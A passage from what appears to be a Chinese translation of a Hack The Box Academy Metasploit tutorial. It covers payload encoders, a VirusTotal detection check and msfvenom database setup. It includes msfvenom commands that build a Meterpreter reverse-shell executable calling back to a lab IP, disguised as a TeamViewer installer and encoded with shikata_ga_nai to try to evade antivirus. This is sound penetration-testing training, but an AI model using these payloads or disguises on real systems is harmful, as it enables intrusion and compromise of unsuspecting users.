然后，我们可以使用<code>show encoders</code>中的命令<code>msfconsole</code>来查看哪些编码器可用于我们当前的<code>Exploit module + Payload</code>组合。</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #  Name              Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----              ---------------  ----    -----  -----------</span><br><span class="line">   0  generic/eicar                      manual  No     The EICAR Encoder</span><br><span class="line">   1  generic/none                       manual  No     The &quot;none&quot; Encoder</span><br><span class="line">   2  x64/xor                            manual  No     XOR Encoder</span><br><span class="line">   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder</span><br><span class="line">   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru</span><br></pre></td></tr></table></figure><p>在前面的例子中，我们只看到了一些适合 x64 系统的编码器。与可用的 payload 一样，这些都是根据 Exploit 模块自动过滤的，只显示兼容的。例如，让我们试试<code>MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit</code>.</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(ms09_050_smb2_negotiate_func_index) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                    Disclosure Date  Rank       Description</span><br><span class="line">   ----                    ---------------  ----       -----------</span><br><span class="line">   generic/none                             normal     The &quot;none&quot; Encoder</span><br><span class="line">   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower</span><br><span class="line">   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder</span><br><span class="line">   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/countdown                            normal     Single-byte XOR Countdown Encoder</span><br><span class="line">   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">   x86/nonalpha                             low        Non-Alpha Encoder</span><br><span class="line">   x86/nonupper                             low        Non-Upper Encoder</span><br><span class="line">   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">   x86/single_static_bit                    manual     Single Static Bit</span><br><span class="line">   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><p>就拿上面的例子来说吧——一个假设的例子。如果我们只使用 SGN 对可执行负载进行一次编码，那么它很可能会被当今的大多数防病毒软件检测到。让我们深入研究一下。拿起处理<code>msfvenom</code>有效载荷生成和编码方案的框架的下标，我们有以下输入：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>这将生成一个<code>exe</code>格式为 TeamViewerInstall.exe 的有效负载，该格式适用于 Windows 平台的 x86 架构处理器，具有隐藏的 Meterpreter reverse_tcp shell 有效负载，使用 Shikata Ga Nai 方案编码一次。让我们把结果上传到 VirusTotal。</p><p>一个更好的选择是尝试通过相同编码方案的多次迭代来运行它：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 449 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 476 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 503 (iteration=5)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 530 (iteration=6)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 557 (iteration=7)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 584 (iteration=8)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 611 (iteration=9)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 611</span><br><span class="line">Payload size: 611 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>正如我们所看到的，这仍然不足以进行 AV 规避。仍有大量产品可以检测有效负载。或者，Metasploit 提供了一个工具<code>msf-virustotal</code>，我们可以使用它和 API 密钥来分析我们的有效载荷。但是，这需要在 VirusTotal 上免费注册。</p><h4 id="无国界医生-VirusTotal"><a href="#无国界医生-VirusTotal" class="headerlink" title="无国界医生 - VirusTotal"></a>无国界医生 - VirusTotal</h4><p> 无国界医生 - VirusTotal</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload TeamViewerInstall.exe...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130</span><br><span class="line">[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9</span><br><span class="line">[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1651750343</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">==================================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version                                                         Result                                                     Update</span><br><span class="line"> ---------             --------  -------                                                         ------                                                     ------</span><br><span class="line"> ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> APEX                  true      6.288                                                           Malicious                                                  20220504</span><br><span class="line"> AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Acronis               true      1.2.0.108                                                       suspicious                                                 20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505</span><br><span class="line"> Alibaba               false     0.3.0.5                                                                                                                    20190527</span><br><span class="line"> Antiy-AVL             false     3.0                                                                                                                        20220505</span><br><span class="line"> Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505</span><br><span class="line"> Baidu                 false     1.0.0.2                                                                                                                    20190318</span><br><span class="line"> BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428</span><br><span class="line"> Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505</span><br><span class="line"> CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505</span><br><span class="line"> CMC                   false     2.10.2019.1                                                                                                                20211026</span><br><span class="line"> ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505</span><br><span class="line"> Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505</span><br><span class="line"> CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418</span><br><span class="line"> Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505</span><br><span class="line"> Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505</span><br><span class="line"> Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505</span><br><span class="line"> DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505</span><br><span class="line"> ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505</span><br><span class="line"> Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503</span><br><span class="line"> Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505</span><br><span class="line"> F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505</span><br><span class="line"> FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505</span><br><span class="line"> Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505</span><br><span class="line"> GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505</span><br><span class="line"> Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505</span><br><span class="line"> Jiangmin              false     16.0.100                                                                                                                   20220504</span><br><span class="line"> K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                                                                                              20220505</span><br><span class="line"> Lionic                false     7.5                                                                                                                        20220505</span><br><span class="line"> MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505</span><br><span class="line"> Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505</span><br><span class="line"> MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505</span><br><span class="line"> McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505</span><br><span class="line"> McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505</span><br><span class="line"> NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505</span><br><span class="line"> Paloalto              false     0.9.0.1003                                                                                                                 20220505</span><br><span class="line"> Panda                 false     4.6.4.2                                                                                                                    20220504</span><br><span class="line"> Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505</span><br><span class="line"> SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430</span><br><span class="line"> Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415</span><br><span class="line"> SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330</span><br><span class="line"> Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505</span><br><span class="line"> Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505</span><br><span class="line"> TACHYON               false     2022-05-05.02                                                                                                              20220505</span><br><span class="line"> Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505</span><br><span class="line"> TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> VBA32                 false     5.0.0                                                                                                                      20220505</span><br><span class="line"> ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504</span><br><span class="line"> VirIT                 false     9.5.188                                                                                                                    20220504</span><br><span class="line"> Webroot               false     1.0.0.403                                                                                                                  20220505</span><br><span class="line"> Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428</span><br><span class="line"> Zillya                false     2.0.0.4625                                                                                                                 20220505</span><br><span class="line"> ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Zoner                 false     2.2.2.0                                                                                                                    20220504</span><br><span class="line"> tehtris               false     v0.1.2                                                                                                                     20220505</span><br></pre></td></tr></table></figure><p>正如预期的那样，我们在野外遇到的大多数反病毒产品仍会检测到此有效负载，因此我们将不得不使用本模块范围之外的其他方法来规避 AV。</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><hr><p><code>Databases</code>in<code>msfconsole</code>用于跟踪您的结果。毫无疑问，在更复杂的机器评估期间，更不用说整个网络了，由于搜索结果、入口点、检测到的问题、发现的凭据等的绝对数量，事情会变得有点模糊和复杂。</p><p>这就是数据库发挥作用的地方。<code>Msfconsole</code>内置了对 PostgreSQL 数据库系统的支持。有了它，我们可以直接、快速、轻松地访问扫描结果，并增加了与第三方工具一起导入和导出结果的能力。数据库条目也可用于直接使用现有的调查结果配置漏洞利用模块参数。</p><hr><h2 id="设置数据库"><a href="#设置数据库" class="headerlink" title="设置数据库"></a>设置数据库</h2><p>首先，我们必须确保 PostgreSQL 服务器在我们的主机上启动并运行。为此，请输入以下命令：</p><h4 id="PostgreSQL-状态"><a href="#PostgreSQL-状态" class="headerlink" title="PostgreSQL 状态"></a>PostgreSQL 状态</h4><p> PostgreSQL 状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo service postgresql status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago</span><br><span class="line">    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2147 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure><h4 id="启动-PostgreSQL"><a href="#启动-PostgreSQL" class="headerlink" title="启动 PostgreSQL"></a>启动 PostgreSQL</h4><p> 启动 PostgreSQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo systemctl start postgresql</span><br></pre></td></tr></table></figure><p>启动 PostgreSQL 后，我们需要创建并初始化 MSF 数据库<code>msfdb init</code>。</p><h4 id="MSF-启动数据库"><a href="#MSF-启动数据库" class="headerlink" title="MSF - 启动数据库"></a>MSF - 启动数据库</h4><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">rake aborted!</span><br><span class="line">NoMethodError: undefined method `without&#x27; for #&lt;Bundler::Settings:0x000055dddcf8cba8&gt;</span><br><span class="line">Did you mean? with_options</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果 Metasploit 不是最新的，有时会发生错误。这种导致错误的差异可能有多种原因。首先，通常它有助于再次更新 Metasploit ( <code>apt update</code>) 来解决这个问题。然后我们可以尝试重新初始化 MSF 数据库。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br></pre></td></tr></table></figure><p>如果初始化被跳过并且 Metasploit 告诉我们数据库已经配置好，我们可以重新检查数据库的状态。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago</span><br><span class="line">    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2476 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br><span class="line"></span><br><span class="line">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line">postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)</span><br><span class="line"></span><br><span class="line">UID          PID    PPID  C STIME TTY      STAT   TIME CMD</span><br><span class="line">postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con</span><br><span class="line"></span><br><span class="line">[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)</span><br></pre></td></tr></table></figure><p>如果这个错误没有出现，这通常发生在全新安装 Metasploit 之后，那么我们将在初始化数据库时看到以下内容：</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[+] Starting database</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br></pre></td></tr></table></figure><p>数据库初始化完成后，我们可以<code>msfconsole</code>同时启动并连接到创建的数据库。</p><h4 id="MSF-连接到启动的数据库"><a href="#MSF-连接到启动的数据库" class="headerlink" title="MSF - 连接到启动的数据库"></a>MSF - 连接到启动的数据库</h4><p> MSF - 连接到启动的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb run</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line">         .                                         .</span><br><span class="line"> .</span><br><span class="line"></span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o</span><br><span class="line">       &#x27;   dB&#x27;                     BBP</span><br><span class="line">    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB</span><br><span class="line">   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB</span><br><span class="line">  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB</span><br><span class="line"></span><br><span class="line">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span><br><span class="line">          .                  .                  dB&#x27; dBP    dB&#x27;.BP</span><br><span class="line">                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP</span><br><span class="line"></span><br><span class="line">                                                                    .</span><br><span class="line">                .</span><br><span class="line">        o                  To boldly go where no</span><br><span class="line">                            shell has gone before</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.39-dev                          ]</span><br><span class="line">+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]</span><br><span class="line">+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf6&gt;</span><br></pre></td></tr></table></figure><p>但是，如果我们已经配置了数据库并且无法将密码更改为 MSF 用户名，请继续执行以下命令：</p><h4 id="MSF-重新启动数据库"><a href="#MSF-重新启动数据库" class="headerlink" title="MSF - 重新启动数据库"></a>MSF - 重新启动数据库</h4><p> MSF - 重新启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfdb reinit</span><br><span class="line">vnswer77@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/</span><br><span class="line">vnswer77@htb[/htb]$ sudo service postgresql restart</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: PostgreSQL.</span><br></pre></td></tr></table></figure><p>现在，我们可以开始了。它还<code>msfconsole</code>为数据库提供集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。</p><h4 id="MSF-数据库选项"><a href="#MSF-数据库选项" class="headerlink" title="MSF - 数据库选项"></a>MSF - 